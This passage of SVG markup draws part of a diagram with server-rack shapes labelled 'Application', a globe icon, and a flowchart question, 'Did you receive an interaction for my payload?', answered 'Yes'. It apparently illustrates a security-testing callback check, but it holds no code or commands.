      <path d="M370.26,460.22a2.71,2.71,0,0,1-.13.86,1.79,1.79,0,0,1-.45.73,2.27,2.27,0,0,1-.82.49,3.46,3.46,0,0,1-1.25.19h-.33v2.43h-1.45v-6.83h1.9a3.77,3.77,0,0,1,1.13.15,2.12,2.12,0,0,1,.79.42,1.64,1.64,0,0,1,.46.67A2.48,2.48,0,0,1,370.26,460.22Zm-3,1.09h.28a1.52,1.52,0,0,0,.93-.25,1,1,0,0,0,.31-.79,1,1,0,0,0-.28-.75,1.33,1.33,0,0,0-.87-.24h-.37Z" fill="#4c5054"/>
    </g>
    <g>
      <rect x="363.05" y="32.52" width="38.84" height="82.55" fill="#159c80" stroke="#159c80" stroke-miterlimit="10" stroke-width="0.5"/>
      <line x1="363.06" y1="59.53" x2="401.9" y2="59.55" fill="none" stroke="#fff" stroke-miterlimit="10" stroke-width="0.5"/>
      <line x1="363.06" y1="67.92" x2="401.9" y2="67.94" fill="none" stroke="#fff" stroke-miterlimit="10" stroke-width="0.5"/>
      <line x1="363.06" y1="50.89" x2="401.91" y2="50.91" fill="none" stroke="#fff" stroke-miterlimit="10" stroke-width="0.5"/>
      <line x1="363.04" y1="93.94" x2="401.88" y2="93.97" fill="none" stroke="#fff" stroke-miterlimit="10" stroke-width="0.5"/>
      <line x1="363.04" y1="102.19" x2="401.88" y2="102.21" fill="none" stroke="#fff" stroke-miterlimit="10" stroke-width="0.5"/>
      <line x1="363.05" y1="76.64" x2="401.89" y2="76.66" fill="none" stroke="#fff" stroke-miterlimit="10" stroke-width="0.5"/>
      <line x1="363.05" y1="85.45" x2="401.89" y2="85.47" fill="none" stroke="#fff" stroke-miterlimit="10" stroke-width="0.5"/>
      <circle cx="367.19" cy="98.38" r="1.18" fill="#fff"/>
      <circle cx="371.54" cy="98.38" r="1.18" fill="#fff"/>
      <circle cx="375.9" cy="98.38" r="1.18" fill="#fff"/>
      <circle cx="380.25" cy="98.39" r="1.18" fill="#fff"/>
      <circle cx="384.6" cy="98.39" r="1.18" fill="#fff"/>
      <circle cx="388.95" cy="98.39" r="1.18" fill="#fff"/>
      <circle cx="393.3" cy="98.39" r="1.18" fill="#fff"/>
      <circle cx="397.65" cy="98.4" r="1.18" fill="#fff"/>
      <circle cx="367.2" cy="89.68" r="1.18" fill="#fff"/>
      <circle cx="371.55" cy="89.68" r="1.18" fill="#fff"/>
      <circle cx="375.9" cy="89.68" r="1.18" fill="#fff"/>
      <circle cx="380.25" cy="89.68" r="1.18" fill="#fff"/>
      <circle cx="384.6" cy="89.69" r="1.18" fill="#fff"/>
      <circle cx="388.96" cy="89.69" r="1.18" fill="#fff"/>
      <circle cx="393.31" cy="89.69" r="1.18" fill="#fff"/>
      <circle cx="397.66" cy="89.69" r="1.18" fill="#fff"/>
      <circle cx="367.2" cy="80.97" r="1.18" fill="#fff"/>
      <circle cx="371.55" cy="80.98" r="1.18" fill="#fff"/>
      <circle cx="375.91" cy="80.98" r="1.18" fill="#fff"/>
      <circle cx="380.26" cy="80.98" r="1.18" fill="#fff"/>
      <circle cx="384.61" cy="80.98" r="1.18" fill="#fff"/>
      <circle cx="388.96" cy="80.99" r="1.18" fill="#fff"/>
      <circle cx="393.31" cy="80.99" r="1.18" fill="#fff"/>
      <circle cx="397.66" cy="80.99" r="1.18" fill="#fff"/>
      <circle cx="367.21" cy="72.27" r="1.18" fill="#fff"/>
      <circle cx="371.56" cy="72.27" r="1.18" fill="#fff"/>
      <circle cx="375.91" cy="72.27" r="1.18" fill="#fff"/>
      <circle cx="380.26" cy="72.28" r="1.18" fill="#fff"/>
      <circle cx="384.61" cy="72.28" r="1.18" fill="#fff"/>
      <circle cx="388.97" cy="72.28" r="1.18" fill="#fff"/>
      <circle cx="393.32" cy="72.28" r="1.18" fill="#fff"/>
      <circle cx="397.67" cy="72.29" r="1.18" fill="#fff"/>
      <circle cx="367.21" cy="63.57" r="1.18" fill="#fff"/>
      <circle cx="371.56" cy="63.57" r="1.18" fill="#fff"/>
      <circle cx="375.92" cy="63.57" r="1.18" fill="#fff"/>
      <circle cx="380.27" cy="63.57" r="1.18" fill="#fff"/>
      <circle cx="384.62" cy="63.58" r="1.18" fill="#fff"/>
      <circle cx="388.97" cy="63.58" r="1.18" fill="#fff"/>
      <circle cx="393.32" cy="63.58" r="1.18" fill="#fff"/>
      <circle cx="397.67" cy="63.58" r="1.18" fill="#fff"/>
      <circle cx="367.22" cy="54.86" r="1.18" fill="#fff"/>
      <circle cx="371.57" cy="54.87" r="1.18" fill="#fff"/>
      <circle cx="375.92" cy="54.87" r="1.18" fill="#fff"/>
      <circle cx="380.27" cy="54.87" r="1.18" fill="#fff"/>
      <circle cx="384.62" cy="54.87" r="1.18" fill="#fff"/>
      <circle cx="388.97" cy="54.88" r="1.18" fill="#fff"/>
      <circle cx="393.33" cy="54.88" r="1.18" fill="#fff"/>
      <circle cx="397.68" cy="54.88" r="1.18" fill="#fff"/>
      <circle cx="367.22" cy="46.16" r="1.18" fill="#fff"/>
      <circle cx="371.57" cy="46.16" r="1.18" fill="#fff"/>
      <circle cx="375.92" cy="46.17" r="1.18" fill="#fff"/>
      <circle cx="380.28" cy="46.17" r="1.18" fill="#fff"/>
      <circle cx="384.63" cy="46.17" r="1.18" fill="#fff"/>
      <circle cx="388.98" cy="46.17" r="1.18" fill="#fff"/>
      <circle cx="393.33" cy="46.17" r="1.18" fill="#fff"/>
      <circle cx="397.68" cy="46.18" r="1.18" fill="#fff"/>
      <line x1="363.07" y1="41.35" x2="401.91" y2="41.37" fill="none" stroke="#fff" stroke-miterlimit="10" stroke-width="0.5"/>
      <rect x="405.75" y="32.54" width="38.84" height="82.55" fill="#159c80" stroke="#159c80" stroke-miterlimit="10" stroke-width="0.5"/>
      <line x1="405.76" y1="59.55" x2="444.6" y2="59.58" fill="none" stroke="#fff" stroke-miterlimit="10" stroke-width="0.5"/>
      <line x1="405.76" y1="67.94" x2="444.6" y2="67.96" fill="none" stroke="#fff" stroke-miterlimit="10" stroke-width="0.5"/>
      <line x1="405.77" y1="50.91" x2="444.61" y2="50.93" fill="none" stroke="#fff" stroke-miterlimit="10" stroke-width="0.5"/>
      <line x1="405.74" y1="93.97" x2="444.58" y2="93.99" fill="none" stroke="#fff" stroke-miterlimit="10" stroke-width="0.5"/>
      <line x1="405.74" y1="102.21" x2="444.58" y2="102.23" fill="none" stroke="#fff" stroke-miterlimit="10" stroke-width="0.5"/>
      <line x1="405.75" y1="76.66" x2="444.59" y2="76.69" fill="none" stroke="#fff" stroke-miterlimit="10" stroke-width="0.5"/>
      <line x1="405.75" y1="85.47" x2="444.59" y2="85.49" fill="none" stroke="#fff" stroke-miterlimit="10" stroke-width="0.5"/>
      <circle cx="409.89" cy="98.4" r="1.18" fill="#fff"/>
      <circle cx="414.25" cy="98.41" r="1.18" fill="#fff"/>
      <circle cx="418.6" cy="98.41" r="1.18" fill="#fff"/>
      <circle cx="422.95" cy="98.41" r="1.18" fill="#fff"/>
      <circle cx="427.3" cy="98.41" r="1.18" fill="#fff"/>
      <circle cx="431.65" cy="98.42" r="1.18" fill="#fff"/>
      <circle cx="436" cy="98.42" r="1.18" fill="#fff"/>
      <circle cx="440.36" cy="98.42" r="1.18" fill="#fff"/>
      <circle cx="409.9" cy="89.7" r="1.18" fill="#fff"/>
      <circle cx="414.25" cy="89.7" r="1.18" fill="#fff"/>
      <circle cx="418.6" cy="89.71" r="1.18" fill="#fff"/>
      <circle cx="422.95" cy="89.71" r="1.18" fill="#fff"/>
      <circle cx="427.31" cy="89.71" r="1.18" fill="#fff"/>
      <circle cx="431.66" cy="89.71" r="1.18" fill="#fff"/>
      <circle cx="436.01" cy="89.71" r="1.18" fill="#fff"/>
      <circle cx="440.36" cy="89.72" r="1.18" fill="#fff"/>
      <circle cx="409.9" cy="81" r="1.18" fill="#fff"/>
      <circle cx="414.26" cy="81" r="1.18" fill="#fff"/>
      <circle cx="418.61" cy="81" r="1.18" fill="#fff"/>
      <circle cx="422.96" cy="81" r="1.18" fill="#fff"/>
      <circle cx="427.31" cy="81.01" r="1.18" fill="#fff"/>
      <circle cx="431.66" cy="81.01" r="1.18" fill="#fff"/>
      <circle cx="436.01" cy="81.01" r="1.18" fill="#fff"/>
      <circle cx="440.37" cy="81.01" r="1.18" fill="#fff"/>
      <circle cx="409.91" cy="72.29" r="1.18" fill="#fff"/>
      <circle cx="414.26" cy="72.3" r="1.18" fill="#fff"/>
      <circle cx="418.61" cy="72.3" r="1.18" fill="#fff"/>
      <circle cx="422.96" cy="72.3" r="1.18" fill="#fff"/>
      <circle cx="427.32" cy="72.3" r="1.18" fill="#fff"/>
      <circle cx="431.67" cy="72.31" r="1.18" fill="#fff"/>
      <circle cx="436.02" cy="72.31" r="1.18" fill="#fff"/>
      <circle cx="440.37" cy="72.31" r="1.18" fill="#fff"/>
      <circle cx="409.91" cy="63.59" r="1.18" fill="#fff"/>
      <circle cx="414.27" cy="63.59" r="1.18" fill="#fff"/>
      <circle cx="418.62" cy="63.6" r="1.18" fill="#fff"/>
      <circle cx="422.97" cy="63.6" r="1.18" fill="#fff"/>
      <circle cx="427.32" cy="63.6" r="1.18" fill="#fff"/>
      <circle cx="431.67" cy="63.6" r="1.18" fill="#fff"/>
      <circle cx="436.02" cy="63.61" r="1.18" fill="#fff"/>
      <circle cx="440.38" cy="63.61" r="1.18" fill="#fff"/>
      <circle cx="409.92" cy="54.89" r="1.18" fill="#fff"/>
      <circle cx="414.27" cy="54.89" r="1.18" fill="#fff"/>
      <circle cx="418.62" cy="54.89" r="1.18" fill="#fff"/>
      <circle cx="422.97" cy="54.89" r="1.18" fill="#fff"/>
      <circle cx="427.33" cy="54.9" r="1.18" fill="#fff"/>
      <circle cx="431.68" cy="54.9" r="1.18" fill="#fff"/>
      <circle cx="436.03" cy="54.9" r="1.18" fill="#fff"/>
      <circle cx="440.38" cy="54.9" r="1.18" fill="#fff"/>
      <circle cx="409.92" cy="46.18" r="1.18" fill="#fff"/>
      <circle cx="414.28" cy="46.19" r="1.18" fill="#fff"/>
      <circle cx="418.63" cy="46.19" r="1.18" fill="#fff"/>
      <circle cx="422.98" cy="46.19" r="1.18" fill="#fff"/>
      <circle cx="427.33" cy="46.19" r="1.18" fill="#fff"/>
      <circle cx="431.68" cy="46.2" r="1.18" fill="#fff"/>
      <circle cx="436.03" cy="46.2" r="1.18" fill="#fff"/>
      <circle cx="440.38" cy="46.2" r="1.18" fill="#fff"/>
      <line x1="405.77" y1="41.38" x2="444.61" y2="41.4" fill="none" stroke="#fff" stroke-miterlimit="10" stroke-width="0.5"/>
      <circle cx="449.93" cy="41.44" r="26.68" fill="#479aad"/>
      <path d="M450.09,13.5a27.8,27.8,0,1,0,0,55.59h0a27.8,27.8,0,1,0,0-55.59Zm20,10.54a14.23,14.23,0,0,1-3.82,3.69,20.44,20.44,0,0,1-3.5,1.89,37,37,0,0,0-4.29-8.74,35.91,35.91,0,0,0-4.73-5.76,26.27,26.27,0,0,1,15,7.49C469.24,23.08,469.69,23.55,470.11,24ZM451.49,67.7l-.75,0v-17a34,34,0,0,1,10.76,1.79,36,36,0,0,1-4.14,8.44A33,33,0,0,1,451.49,67.7ZM438.63,52.48a33,33,0,0,1,10.76-1.78v17c-.25,0-.5,0-.74,0A35.6,35.6,0,0,1,438.63,52.48Zm10-37.58.74,0v17a33.67,33.67,0,0,1-10.75-1.79,35.77,35.77,0,0,1,4.13-8.43A32.61,32.61,0,0,1,448.67,14.9Zm12.85,15.21a34,34,0,0,1-10.76,1.79v-17l.75,0A35.62,35.62,0,0,1,461.52,30.11Zm-10.76,3.15a34.69,34.69,0,0,0,11.18-1.83,35.44,35.44,0,0,1,1.4,9.19H450.76Zm-1.36,0v7.36H436.82a35.09,35.09,0,0,1,1.41-9.19A34.59,34.59,0,0,0,449.4,33.26Zm-13.94,7.35H423.65a26.18,26.18,0,0,1,5.52-15.48A18,18,0,0,0,437,30.93,36.39,36.39,0,0,0,435.46,40.61Zm0,1.36A36,36,0,0,0,437,51.65a18,18,0,0,0-7.8,5.8A26.19,26.19,0,0,1,423.65,42Zm1.36,0H449.4v7.36a34.38,34.38,0,0,0-11.17,1.82A34.61,34.61,0,0,1,436.82,42Zm13.93,7.37V42h12.57a35,35,0,0,1-1.4,9.19A34.69,34.69,0,0,0,450.75,49.34ZM464.7,42h11.81A26.28,26.28,0,0,1,471,57.48a17.9,17.9,0,0,0-7.79-5.81A36.39,36.39,0,0,0,464.7,42Zm0-1.37a36.41,36.41,0,0,0-1.49-9.68,18,18,0,0,0,7.8-5.8,26.21,26.21,0,0,1,5.5,15.49Zm-33.31-18a26.31,26.31,0,0,1,15-7.48,36.37,36.37,0,0,0-4.73,5.76,37,37,0,0,0-4.3,8.74,20,20,0,0,1-3.49-1.9A14.07,14.07,0,0,1,430.07,24C430.49,23.53,430.93,23.05,431.39,22.59Zm-1.34,36A16.42,16.42,0,0,1,437.37,53a37.43,37.43,0,0,0,4.29,8.74,36.9,36.9,0,0,0,4.72,5.76,26.28,26.28,0,0,1-15-7.5C430.91,59.52,430.47,59,430.05,58.55ZM468.76,60a26.25,26.25,0,0,1-15,7.48,37.47,37.47,0,0,0,9-14.49,20.35,20.35,0,0,1,3.49,1.89,14.37,14.37,0,0,1,3.82,3.7C469.67,59.06,469.22,59.54,468.76,60Z" fill="#fff"/>
    </g>
    <text transform="translate(362.85 132.45)" font-size="13" fill="#159c80" font-family="Verdana-Bold, Verdana" font-weight="700">Application</text>
    <rect x="22.5" y="609.5" width="310" height="26" fill="#fff" stroke="#0071bc" stroke-miterlimit="10"/>
    <rect x="161.5" y="660.5" width="44" height="26" fill="#fff" stroke="#0071bc" stroke-miterlimit="10"/>
    <text transform="translate(36.93 625)" font-size="12" fill="#0071bc" font-family="Verdana, Verdana">Did <tspan x="24.23" y="0" letter-spacing="-0.01em">y</tspan><tspan x="31.23" y="0">ou recei</tspan><tspan x="79.29" y="0" letter-spacing="-0.01em">v</tspan><tspan x="86.29" y="0">e an inte</tspan><tspan x="139.44" y="0" letter-spacing="-0.02em">r</tspan><tspan x="144.35" y="0">action for </tspan><tspan x="205.76" y="0" letter-spacing="-0.01em">m</tspan><tspan x="217.32" y="0">y p</tspan><tspan x="236.12" y="0" letter-spacing="-0.01em">a</tspan><tspan x="243.23" y="0">yload?</tspan></text>
    <text transform="translate(173.24 676)" font-size="12" fill="#0071bc" font-family="Verdana, Verdana"><tspan letter-spacing="-0.06em">Y</tspan><tspan x="6.62" y="0">es</tspan></text>
  </g>
</svg>
